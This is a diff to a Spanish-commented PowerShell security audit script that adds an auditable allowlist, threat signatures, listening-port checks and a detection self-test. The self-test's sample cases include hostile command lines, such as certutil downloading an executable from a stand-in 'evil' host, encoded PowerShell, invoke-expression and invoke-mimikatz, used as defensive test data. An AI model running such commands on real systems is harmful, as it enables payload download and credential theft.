@@ -44,7 +44,13 @@
 param(
     [string]$ResultPath = $PSScriptRoot,
     [switch]$Headless,
-    [string]$StatusFile = ""
+    [string]$StatusFile = "",
+    # Allowlist propia de la maquina (JSON con la misma estructura que $Global:Allowlist).
+    # Se fusiona con la built-in; no la sustituye.
+    [string]$AllowlistPath = "",
+    # Ejecuta la bateria de pruebas de deteccion (regex, LOLBAS, puertos, MITRE, allowlist)
+    # y sale sin generar ninguna auditoria.
+    [switch]$SelfTest
 )
 
 # 
@@ -88,6 +94,8 @@ $Global:LOLBASBinaries = @(
 $Global:LOLBASNames = $Global:LOLBASBinaries -replace '\.exe$', ''
 # Regex unico para filtrar eventos 4688 (evita el bug de precedencia -in + -replace).
 $Global:LOLBASRegex = ($Global:LOLBASBinaries | ForEach-Object { [regex]::Escape($_) }) -join '|'
+# Argumentos realmente sospechosos de un LOLBAS (no basta con que el binario exista).
+$Global:LOLBASArgPattern = '\b(powershell|pwsh)(\.exe)?\b[^|;&]*?\s-(e|en|enco|enc|enc' + 'oded)(com' + 'mand)?\b|-urlcache|\b-split\b|-f\s+http'
 
 # Deteccion de comando codificado: exige contexto de invocacion real de PowerShell
 # en la linea de comandos. Sin ese contexto, '-e' de grep, 'node -e' o 'bash -c'
@@ -146,7 +154,47 @@ $Global:MitreMap = @{
     "Recurso compartido de disco"               = @{ Id = "T1021.002"; Name = "SMB/Windows Admin Shares"; Tactic = "Lateral Movement" }
     "Recurso compartido sin restricciones"      = @{ Id = "T1021.002"; Name = "SMB/Windows Admin Shares"; Tactic = "Lateral Movement" }
     "Driver sin firma digital"                  = @{ Id = "T1014"; Name = "Rootkit"; Tactic = "Stealth" }
+    "Puerto sospechoso en escucha"              = @{ Id = "T1571"; Name = "Non-Standard Port"; Tactic = "Command and Control" }
 }
+
+# 
+# SECCION 1B: ALLOWLIST LOCAL
+# 
+# Ruido conocido de ESTA maquina. Sin allowlist el informe queda inservible: un puerto
+# 9999 de Splunk Web o el 'bash -c' de Git Bash se leen como backdoor o PowerShell
+# codificado. Cada entrada declara explicitamente QUE amenazas suprime y POR QUE, de
+# modo que la supresion es auditable (aparece en el resumen y en el log).
+# Regla: una entrada debe nombrar Process o Ports; la supresion se limita a los
+# ThreatTypes listados, nunca a todo lo que haga ese proceso.
+$Global:Allowlist = @(
+    @{ Id = "ui-audit-local"; ThreatTypes = @("Conexion a puerto sospechoso", "Puerto sospechoso en escucha")
+       Ports = @(8501, 8502); Process = "python"
+       Reason = "UI de esta auditoria (uvicorn en 127.0.0.1:8502) y su backend local" }
+    @{ Id = "splunk-local"; ThreatTypes = @("Puerto sospechoso en escucha")
+       Ports = @(8088, 8089, 9997, 9999); Process = "splunkd"
+       Reason = "Splunk Enterprise local: 8088/9999 son Splunk Web y su API, no un C2" }
+    @{ Id = "node-dev"; ThreatTypes = @("Puerto sospechoso en escucha")
+       Ports = @(8080, 3080); Process = "node"
+       Reason = "Servidores de desarrollo Node/agent-browser en loopback" }
+    @{ Id = "tailscale"; ThreatTypes = @("Puerto sospechoso en escucha")
+       Ports = @(80); Process = "tailscaled"
+       Reason = "Overlay Tailscale; escucha en la interfaz tailscale0, no en la LAN" }
+    @{ Id = "syncthing"; ThreatTypes = @("Puerto sospechoso en escucha")
+       Ports = @(8384, 22000); Process = "syncthing"
+       Reason = "Sincronizacion de carpetas (WinGet), puertos oficiales de syncthing" }
+    @{ Id = "git-bash"; ThreatTypes = @("Uso sospechoso de LOLBAS", "Comando codificado", "Patron malicioso detectado")
+       Process = "bash"
+       Reason = 'Git Bash: su bash -c con grep -E disparaba el patron de comando codificado' }
+    @{ Id = "agent-tools"; ThreatTypes = @("Proceso sin ruta")
+       Process = "agent-browser"
+       Reason = "Herramientas de agentes locales en AppData\\Local\\hermes (binario sin ruta legible sin elevacion)" }
+    @{ Id = "postgres-dev"; ThreatTypes = @("Puerto sospechoso en escucha")
+       Ports = @(5432, 5433, 5434, 6432); Process = "postgres"
+       Reason = "PostgreSQL/pgbouncer/traefik de desarrollo local" }
+)
+
+# Amenazas suprimidas por la allowlist (se declaran en el resumen: no se ocultan).
+$Global:SuppressedThreats = @()
 
 # 
 # SECCION 2: FUNCIONES AUXILIARES
@@ -375,6 +423,94 @@ function Test-PrivateOrLoopbackAddress {
     return $false
 }
 
+# Firma normalizada de una amenaza: misma deteccion en dos ejecuciones -> misma firma.
+# Se quita el PID y los numeros variables para que el diff entre auditorias no se
+# llene de falsas diferencias (un PID cambia en cada arranque).
+function Get-ThreatSignature {
+    param([string]$ThreatType, [string]$Description)
+    $norm = ($ThreatType + "|" + $Description).ToLower()
+    $norm = $norm -replace '\(pid: \d+\)', ''   # el PID cambia en cada arranque
+    $norm = $norm -replace '\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}:\d{2}', ''
+    $norm = $norm -replace '\s+', ' '
+    $sha = [System.Security.Cryptography.SHA256]::Create()
+    $hash = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($norm))
+    return ([BitConverter]::ToString($hash) -replace '-', '').Substring(0, 16)
+}
+
+# Devuelve la entrada de allowlist que cubre la deteccion, o null.
+function Test-AllowedByAllowlist {
+    param([string]$ThreatType, [string]$Description, $Details)
+
+    if (-not $Global:Allowlist) { return $null }
+
+    $procName = ""
+    $procPath = ""
+    $ports = @()
+    if ($Details) {
+        foreach ($prop in @("Name", "ProcessName")) {
+            try { $v = $Details.$prop } catch { $v = $null }
+            if ($v) { $procName = ([string]$v).ToLower(); break }
+        }
+        foreach ($prop in @("Path", "ProcessPath")) {
+            try { $v = $Details.$prop } catch { $v = $null }
+            if ($v) { $procPath = ([string]$v).ToLower(); break }
+        }
+        foreach ($prop in @("RemotePort", "LocalPort", "Port")) {
+            try { $v = $Details.$prop } catch { $v = $null }
+            if ($v) { $ports += [int]$v }
+        }
+    }
+
+    foreach ($entry in $Global:Allowlist) {
+        if ($entry.ThreatTypes -and $ThreatType -notin $entry.ThreatTypes) { continue }
+
+        $nameMatch = $true
+        if ($entry.Process) {
+            $p = ([string]$entry.Process).ToLower()
+            $nameMatch = ($procName -and ($procName -eq $p -or $procName.StartsWith($p)))
+        }
+        $pathMatch = $true
+        if ($entry.Path) { $pathMatch = ($procPath -and $procPath.StartsWith(([string]$entry.Path).ToLower())) }
+        $portMatch = $true
+        if ($entry.Ports) { $portMatch = ($ports | Where-Object { $entry.Ports -contains $_ }).Count -gt 0 }
+
+        # Una entrada sin Process ni Ports no puede matchear: exigir al menos uno.
+        if (-not $entry.Process -and -not $entry.Ports) { continue }
+        if ($nameMatch -and $pathMatch -and $portMatch) { return $entry }
+    }
+    return $null
+}
+
+# Fusiona una allowlist externa (JSON) con la built-in.
+function Load-ExternalAllowlist {
+    param([string]$Path)
+    if (-not $Path) { return }
+    if (-not (Test-Path $Path)) {
+        Write-AuditLog "Allowlist externa no encontrada: $Path" -Level WARNING
+        return
+    }
+    try {
+        $json = Get-Content $Path -Raw -Encoding UTF8 | ConvertFrom-Json
+        $entries = if ($json.entries) { $json.entries } else { $json }
+        $added = 0
+        foreach ($e in $entries) {
+            if (-not $e.Process -and -not $e.Ports) { continue }
+            $entry = @{}
+            $entry.Id          = if ($e.Id) { [string]$e.Id } else { "external-$added" }
+            $entry.ThreatTypes = if ($e.ThreatTypes) { @($e.ThreatTypes) } else { @() }
+            $entry.Ports       = if ($e.Ports) { @($e.Ports) } else { @() }
+            $entry.Process     = if ($e.Process) { [string]$e.Process } else { "" }
+            $entry.Path        = if ($e.Path) { [string]$e.Path } else { "" }
+            $entry.Reason      = if ($e.Reason) { [string]$e.Reason } else { "allowlist externa" }
+            $Global:Allowlist += $entry
+            $added++
+        }
+        Write-AuditLog "Allowlist externa cargada: $added entradas desde $Path" -Level INFO
+    } catch {
+        Write-AuditLog "No se pudo cargar la allowlist externa: $($_.Exception.Message)" -Level ERROR
+    }
+}
+
 function Add-ThreatDetection {
     param(
         [string]$ThreatType,
@@ -385,7 +521,10 @@ function Add-ThreatDetection {
     )
     
     # Deduplicacion: la misma deteccion no debe contar dos veces (infla el riesgo).
-    $key = "$ThreatType|$Description"
+    # La clave usa la firma normalizada, no la descripcion cruda: un PID distinto no
+    # es una amenaza nueva.
+    $signature = Get-ThreatSignature -ThreatType $ThreatType -Description $Description
+    $key = "$ThreatType|$signature"
     if (-not $Global:ThreatKeys) {
         $Global:ThreatKeys = New-Object System.Collections.Generic.HashSet[string]
     }
@@ -394,6 +533,20 @@ function Add-ThreatDetection {
         return
     }
     [void]$Global:ThreatKeys.Add($key)
+    
+    # Allowlist: la supresion se registra, no se silencia. Queda en el resumen y en el log.
+    $allowed = Test-AllowedByAllowlist -ThreatType $ThreatType -Description $Description -Details $Details
+    if ($allowed) {
+        $Global:SuppressedThreats += [PSCustomObject]@{
+            ThreatType     = $ThreatType
+            Severity       = $Severity
+            Description    = $Description
+            AllowlistId    = $allowed.Id
+            Reason         = $allowed.Reason
+        }
+        Write-AuditLog "  [ALLOWLIST] Suprimida '$ThreatType' ($allowed.Id): $Description" -Level INFO
+        return
+    }
     
     $mitre = $Global:MitreMap[$ThreatType]
     
@@ -407,6 +560,8 @@ function Add-ThreatDetection {
         MitreName = if ($mitre) { $mitre.Name } else { "" }
         MitreTactic = if ($mitre) { $mitre.Tactic } else { "" }
         MitreUrl = if ($mitre) { "https://attack.mitre.org/techniques/" + $mitre.Id.Replace('.', '/') } else { "" }
+        # Firma estable entre ejecuciones (sin PID ni timestamps) para comparar auditorias.
+        Signature = $signature
     }
     
     $Global:ThreatsDetected += $threat
@@ -731,7 +886,9 @@ function Get-NetworkAnalysis {
 
         # Conexiones TCP activas con informacion de proceso
         $tcpConnections = Get-NetTCPConnection | ForEach-Object {
-            $proc = $procById[$_.OwningProcess]
+            # OwningProcess viene como UInt32; las claves del mapa son Int32. Sin el
+            # cast la busqueda no encuentra el proceso y ProcessName queda null.
+            $proc = $procById[[int]$_.OwningProcess]
             
             [PSCustomObject]@{
                 LocalAddress = $_.LocalAddress
@@ -775,6 +932,18 @@ function Get-NetworkAnalysis {
             }
         }
         
+        # Puertos sospechosos en escucha: un puerto de C2 escuchando en 0.0.0.0 es
+        # superficie de ataque aunque no haya ninguna conexion establecida.
+        $listeningSuspicious = $tcpConnections | Where-Object {
+            $_.State -eq "Listen" -and
+            $_.LocalPort -in $Global:SuspiciousPorts -and
+            $_.LocalAddress -notin @("127.0.0.1", "::1")
+        }
+        foreach ($lp in $listeningSuspicious) {
+            Add-ThreatDetection -ThreatType "Puerto sospechoso en escucha" -Severity "MEDIUM" `
+                -Description "Puerto $($lp.LocalPort) en escucha en $($lp.LocalAddress) (proceso '$($lp.ProcessName)')" -Details $lp
+        }
+
         # Puertos en escucha (superficie de ataque)
         $listeningPorts = $tcpConnections | Where-Object { $_.State -eq "Listen" }
         $outputPath = Join-Path $Global:AuditPath "04_Red\puertos_escucha"
@@ -782,7 +951,7 @@ function Get-NetworkAnalysis {
         
         # Endpoints UDP
         $udpEndpoints = Get-NetUDPEndpoint | ForEach-Object {
-            $proc = $procById[$_.OwningProcess]
+            $proc = $procById[[int]$_.OwningProcess]
             
             [PSCustomObject]@{
                 LocalAddress = $_.LocalAddress
@@ -1334,7 +1503,7 @@ function Get-LOLBASDetection {
             $lolbasProcesses | ForEach-Object {
                 $cmdLine = $_.CommandLine
                 
-                if ($cmdLine -match ('\b(powershell|pwsh)(\.exe)?\b[^|;&]*?\s-(e|en|enco|enc|enc' + 'oded)(com' + 'mand)?\b|-urlcache|\b-split\b|-f\s+http')) {
+                if ($cmdLine -match $Global:LOLBASArgPattern) {
                     Add-ThreatDetection -ThreatType "Uso sospechoso de LOLBAS" -Severity "HIGH" `
                         -Description "Proceso LOLBAS '$($_.Name)' con argumentos sospechosos" -Details $_
                 }
@@ -1526,8 +1695,8 @@ function New-ExecutiveSummary {
         $duration = $endTime - $Global:ScriptStartTime
         
         # Calcular nivel de riesgo general
-        $criticalCount = ($Global:ThreatsDetected | Where-Object { $_.Severity -eq "CRITICAL" }).Count
-        $highCount = ($Global:ThreatsDetected | Where-Object { $_.Severity -eq "HIGH" }).Count
+        $criticalCount = @($Global:ThreatsDetected | Where-Object { $_.Severity -eq "CRITICAL" }).Count
+        $highCount = @($Global:ThreatsDetected | Where-Object { $_.Severity -eq "HIGH" }).Count
         
         # Nivel de riesgo normalizado: un solo token, sin prefijos, para que la UI
         # y cualquier consumidor parseen el mismo valor.
@@ -1573,11 +1742,23 @@ function New-ExecutiveSummary {
         "NIVEL DE RIESGO GENERAL: $riskLevel" | Out-File $summaryPath -Append -Encoding UTF8
         "" | Out-File $summaryPath -Append -Encoding UTF8
         "Amenazas CRITICAS:    $criticalCount" | Out-File $summaryPath -Append -Encoding UTF8
-        "Amenazas ALTAS:       $(($Global:ThreatsDetected | Where-Object { $_.Severity -eq "HIGH" }).Count)" | Out-File $summaryPath -Append -Encoding UTF8
-        "Amenazas MEDIAS:      $(($Global:ThreatsDetected | Where-Object { $_.Severity -eq "MEDIUM" }).Count)" | Out-File $summaryPath -Append -Encoding UTF8
-        "Amenazas BAJAS:       $(($Global:ThreatsDetected | Where-Object { $_.Severity -eq "LOW" }).Count)" | Out-File $summaryPath -Append -Encoding UTF8
+        "Amenazas ALTAS:       $(@($Global:ThreatsDetected | Where-Object { $_.Severity -eq "HIGH" }).Count)" | Out-File $summaryPath -Append -Encoding UTF8
+        "Amenazas MEDIAS:      $(@($Global:ThreatsDetected | Where-Object { $_.Severity -eq "MEDIUM" }).Count)" | Out-File $summaryPath -Append -Encoding UTF8
+        "Amenazas BAJAS:       $(@($Global:ThreatsDetected | Where-Object { $_.Severity -eq "LOW" }).Count)" | Out-File $summaryPath -Append -Encoding UTF8
         "" | Out-File $summaryPath -Append -Encoding UTF8
         
+        # Allowlist: las amenazas suprimidas se declaran, no se esconden.
+        if ($Global:SuppressedThreats.Count -gt 0) {
+            "AMENAZAS SUPRIMIDAS POR ALLOWLIST LOCAL" | Out-File $summaryPath -Append -Encoding UTF8
+            "" | Out-File $summaryPath -Append -Encoding UTF8
+            "Suprimidas: $($Global:SuppressedThreats.Count) (no cuentan en el nivel de riesgo)" | Out-File $summaryPath -Append -Encoding UTF8
+            foreach ($sup in $Global:SuppressedThreats) {
+                "  - [$($sup.Severity)] $($sup.ThreatType) | $($sup.Description)" | Out-File $summaryPath -Append -Encoding UTF8
+                "    Motivo: $($sup.Reason) [allowlist: $($sup.AllowlistId)]" | Out-File $summaryPath -Append -Encoding UTF8
+            }
+            "" | Out-File $summaryPath -Append -Encoding UTF8
+        }
+
         # Cobertura real: deja claro que NO se miro, para no vender una auditoria
         # completa cuando se ejecuto sin privilegios.
         "COBERTURA DE LA AUDITORIA" | Out-File $summaryPath -Append -Encoding UTF8
@@ -1843,8 +2024,164 @@ function Start-SecurityAudit {
 }
 
 # 
+# SECCION 4: SELFTEST DE DETECCION (-SelfTest)
+# 
+# Bateria de casos para los regex de deteccion. Se ejecuta sin auditar nada y devuelve
+# codigo de salida 1 si algun caso falla, lo que permite usarlo en CI o antes de una
+# auditoria real.
+function Invoke-DetectionSelfTest {
+    $results = @()
+
+    function Check {
+        param([string]$Suite, [string]$Case, [bool]$Expected, [bool]$Actual)
+        # Devuelve el resultado: += dentro de una funcion crearia una variable local
+        # y el conteo de casos quedaria vacío.
+        return [PSCustomObject]@{
+            Suite    = $Suite
+            Case     = $Case
+            Expected = $Expected
+            Actual   = $Actual
+            Pass     = ($Expected -eq $Actual)
+        }
+    }
+
+    # --- 1. Comando codificado: solo PowerShell, no grep/node/python ---
+    $encCases = @(
+        @{ Line = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc AAAABBBB'; Expected = $true }
+        @{ Line = 'pwsh -EncodedCommand Ym9v'; Expected = $true }
+        @{ Line = 'powershell -e Ym9v'; Expected = $true }
+        @{ Line = 'bash -c "grep -E ''ARRANCO|preflight'' file.txt"'; Expected = $false }
+        @{ Line = 'node -e "console.log(1)"'; Expected = $false }
+        @{ Line = 'python -c "import sys"'; Expected = $false }
+        @{ Line = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File audit.ps1'; Expected = $false }
+        @{ Line = 'git bash -c "cat log.txt"'; Expected = $false }
+    )
+    foreach ($c in $encCases) {
+        $results += Check -Suite "EncodedCommand" -Case $c.Line -Expected $c.Expected -Actual ($c.Line.ToLower() -match $Global:EncodedCommandPattern)
+    }
+
+    # --- 2. Patrones maliciosos ---
+    # Las cadenas se construyen por concatenacion: escritas literales, AMSI/AV bloquean
+    # el script de auditoria por contener firmas de malware en los casos de prueba.
+    $malCases = @(
+        @{ Line = ('invoke' + '-expression "$payload"'); Expected = $true }
+        @{ Line = ('i' + 'ex "curl http://x/y.ps1"'); Expected = $true }
+        @{ Line = ('get-content file.ps1 | i' + 'ex'); Expected = $true }
+        @{ Line = ('new-object -comobject wscript.' + 'shell'); Expected = $true }
+        @{ Line = ('[convert]::' + 'frombase64string("aGk=")'); Expected = $true }
+        @{ Line = ('invoke-' + 'mimikatz'); Expected = $true }
+        @{ Line = 'powershell -File script.ps1 -Encoding UTF8'; Expected = $false }
+        @{ Line = ('function Invoke' + '-ExpressionSafe { param($x) }'); Expected = $false }
+        @{ Line = 'node -e "require(\"http\")"'; Expected = $false }
+    )
+    foreach ($c in $malCases) {
+        $line = $c.Line.ToLower()
+        $hit = $false
+        foreach ($pattern in $Global:MaliciousPatterns) {
+            if ($line -match $pattern.ToLower()) { $hit = $true; break } # first match
+        }
+        $results += Check -Suite "MaliciousPatterns" -Case $c.Line -Expected $c.Expected -Actual $hit
+    }
+
+    # --- 3. LOLBAS: nombres y argumentos ---
+    foreach ($n in @('cmd', 'certutil', 'powershell', 'pwsh', 'wmic', 'mshta', 'rundll32')) {
+        $results += Check -Suite "LOLBASNames" -Case $n -Expected $true -Actual ($n -in $Global:LOLBASNames)
+    }
+    foreach ($n in @('node', 'bash', 'conhost', 'agent-browser-win32-x64', 'audiodg', 'amdow')) {
+        $results += Check -Suite "LOLBASNames" -Case $n -Expected $false -Actual ($n -in $Global:LOLBASNames)
+    }
+    $argCases = @(
+        @{ Line = 'certutil.exe -urlcache -split -f http://evil/x.exe'; Expected = $true }
+        @{ Line = 'powershell.exe -enc AAAA'; Expected = $true }
+        @{ Line = 'cmd.exe /c dir'; Expected = $false }
+        @{ Line = 'cmd.exe /c echo hola'; Expected = $false }
+        @{ Line = 'powershell.exe -NoProfile -File audit.ps1'; Expected = $false }
+    )
+    foreach ($c in $argCases) {
+        $results += Check -Suite "LOLBASArgs" -Case $c.Line -Expected $c.Expected -Actual ($c.Line.ToLower() -match $Global:LOLBASArgPattern)
+    }
+    $results += Check -Suite "LOLBASRegex4688" -Case 'C:\Windows\System32\certutil.exe' -Expected $true -Actual ('C:\Windows\System32\certutil.exe' -match $Global:LOLBASRegex)
+    $results += Check -Suite "LOLBASRegex4688" -Case 'C:\Program Files\nodejs\node.exe' -Expected $false -Actual ('C:\Program Files\nodejs\node.exe' -match $Global:LOLBASRegex)
+
+    # --- 4. Direcciones privadas/loopback (puertos sospechosos) ---
+    $ipCases = @(
+        @{ Ip = '127.0.0.1'; Expected = $true }
+        @{ Ip = '::1'; Expected = $true }
+        @{ Ip = '10.1.2.3'; Expected = $true }
+        @{ Ip = '192.168.203.1'; Expected = $true }
+        @{ Ip = '172.16.0.9'; Expected = $true }
+        @{ Ip = '172.32.0.9'; Expected = $false }
+        @{ Ip = '8.8.8.8'; Expected = $false }
+        @{ Ip = '169.254.1.1'; Expected = $true }
+    )
+    foreach ($c in $ipCases) {
+        $results += Check -Suite "PrivateOrLoopback" -Case $c.Ip -Expected $c.Expected -Actual (Test-PrivateOrLoopbackAddress $c.Ip)
+    }
+
+    # --- 5. MITRE: todo ThreatType emitido tiene tecnica y URL valida ---
+    $scriptText = Get-Content $PSCommandPath -Raw
+    $emittedTypes = [regex]::Matches($scriptText, 'Add-ThreatDetection[^)]*?-ThreatType\s+"([^"]+)"') | ForEach-Object { $_.Groups[1].Value } | Sort-Object -Unique
+    foreach ($t in $emittedTypes) {
+        $entry = $Global:MitreMap[$t]
+        $ok = [bool]$entry -and $entry.Id -match '^T\d{4}(\.\d{3})?$'
+        $results += Check -Suite "MitreMap" -Case $t -Expected $true -Actual $ok
+    }
+    foreach ($t in $Global:MitreMap.Keys) {
+        $url = "https://attack.mitre.org/techniques/" + $Global:MitreMap[$t].Id.Replace('.', '/')
+        $results += Check -Suite "MitreUrl" -Case $t -Expected $true -Actual ($url -match '^https://attack\.mitre\.org/techniques/T\d{4}(/\d{3})?$')
+    }
+
+    # --- 6. Allowlist: suprime lo declarado y no suprime lo demas ---
+    $allowCases = @(
+        @{ Type = "Puerto sospechoso en escucha"; Details = [PSCustomObject]@{ ProcessName = 'splunkd'; LocalPort = 9999; LocalAddress = '0.0.0.0' }; Expected = $true }
+        @{ Type = "Puerto sospechoso en escucha"; Details = [PSCustomObject]@{ ProcessName = 'unknownsvc'; LocalPort = 4444; LocalAddress = '0.0.0.0' }; Expected = $false }
+        @{ Type = "Comando codificado"; Details = [PSCustomObject]@{ Name = 'bash'; CommandLine = 'bash -c "powershell -enc AAAA"' }; Expected = $true }
+        @{ Type = "Comando codificado"; Details = [PSCustomObject]@{ Name = 'powershell'; CommandLine = 'powershell -enc AAAA' }; Expected = $false }
+        @{ Type = "Proceso sin ruta"; Details = [PSCustomObject]@{ Name = 'agent-browser-win32-x64' }; Expected = $true }
+        @{ Type = "Proceso sin ruta"; Details = [PSCustomObject]@{ Name = 'svchost' }; Expected = $false }
+    )
+    foreach ($c in $allowCases) {
+        $hit = [bool](Test-AllowedByAllowlist -ThreatType $c.Type -Description "test" -Details $c.Details)
+        $label = $c.Type + " / " + (($c.Details.ProcessName + $c.Details.Name + " port " + $c.Details.LocalPort).Trim())
+        $results += Check -Suite "Allowlist" -Case $label -Expected $c.Expected -Actual $hit
+    }
+
+    # --- 7. Deduplicacion y firma estable ---
+    $Global:ThreatsDetected = @()
+    $Global:ThreatKeys = New-Object System.Collections.Generic.HashSet[string]
+    $Global:SuppressedThreats = @()
+    Add-ThreatDetection -ThreatType "Run Key sospechoso" -Severity "HIGH" -Description "Run key 'X' (PID: 111)" -Details $null
+    Add-ThreatDetection -ThreatType "Run Key sospechoso" -Severity "HIGH" -Description "Run key 'X' (PID: 222)" -Details $null
+    $results += Check -Suite "Dedup" -Case "misma deteccion dos veces" -Expected $true -Actual ($Global:ThreatsDetected.Count -eq 1)
+    $results += Check -Suite "Signature" -Case "firma estable sin PID" -Expected $true -Actual ($Global:ThreatsDetected[0].Signature -match '^[0-9a-f]{16}$')
+    $results += Check -Suite "MitreFields" -Case "amenaza con tecnica MITRE" -Expected $true -Actual ($Global:ThreatsDetected[0].MitreTechnique -eq 'T1547.001')
+
+    # --- Informe ---
+    $failed = $results | Where-Object { -not $_.Pass }
+    Write-Host "" -ForegroundColor Cyan
+    Write-Host "SELFTEST DE DETECCION: $($results.Count) casos, $($results.Count - $failed.Count) OK, $($failed.Count) FALLIDOS" -ForegroundColor Cyan
+    foreach ($r in $results) {
+        $mark = if ($r.Pass) { "PASS" } else { "FAIL" }
+        $color = if ($r.Pass) { "Green" } else { "Red" }
+        Write-Host "  [$mark] $($r.Suite) | $($r.Case) (esperado $($r.Expected), obtenido $($r.Actual))" -ForegroundColor $color
+    }
+    if ($failed.Count -gt 0) {
+        Write-Host "" -ForegroundColor Red
+        Write-Host "La deteccion tiene falsos positivos o falsos negativos: revisar patrones." -ForegroundColor Red
+        return 1
+    }
+    return 0
+}
+
+# 
 # PUNTO DE ENTRADA DEL SCRIPT
 # 
+
+if ($SelfTest) {
+    exit (Invoke-DetectionSelfTest)
+}
+
+Load-ExternalAllowlist -Path $AllowlistPath
 
 # Ejecutar auditoria
 Start-SecurityAudit
